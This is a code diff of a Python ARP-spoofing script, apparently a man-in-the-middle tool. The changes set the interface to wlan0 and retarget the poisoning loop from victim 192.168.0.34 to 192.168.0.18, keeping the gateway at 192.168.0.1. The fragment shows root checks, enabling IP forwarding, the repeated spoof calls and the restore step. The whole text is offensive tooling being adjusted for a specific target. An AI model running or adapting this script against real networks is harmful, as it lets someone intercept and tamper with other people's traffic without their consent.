@@ -3,7 +3,7 @@ import time
 import os
 import sys
 
-IFACE = "en0"   # eth0 linux
+IFACE = "wlan0"   # eth0 linux
 
 
 def check_super_user():
@@ -11,7 +11,7 @@ def check_super_user():
 
 
 def enable_forwarding():
-    if IFACE == 'eth0':
+    if IFACE == 'wlan0':
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     elif IFACE == 'en0':
         os.system("sysctl -w net.inet.ip.forwarding=1")
@@ -56,15 +56,15 @@ if __name__ == '__main__':
         enable_forwarding()
         try:
             while True:
-                spoof("192.168.0.34", "192.168.0.1")
-                spoof("192.168.0.1", "192.168.0.34")
+                spoof("192.168.0.18", "192.168.0.1")
+                spoof("192.168.0.1", "192.168.0.18")
                 sent_packets_count += 2
                 print("\r[-] Packets sent: {}".format(sent_packets_count), end="")
                 time.sleep(2)
         except KeyboardInterrupt:
             print("\n[+] Detected CTRL + C ... Restoring")
-            restore("192.168.0.34", "192.168.0.1")
-            restore("192.168.0.1", "192.168.0.34")
+            restore("192.168.0.18", "192.168.0.1")
+            restore("192.168.0.1", "192.168.0.18")
     else:
         print('[!] Access denied. Please SUDO!')
 
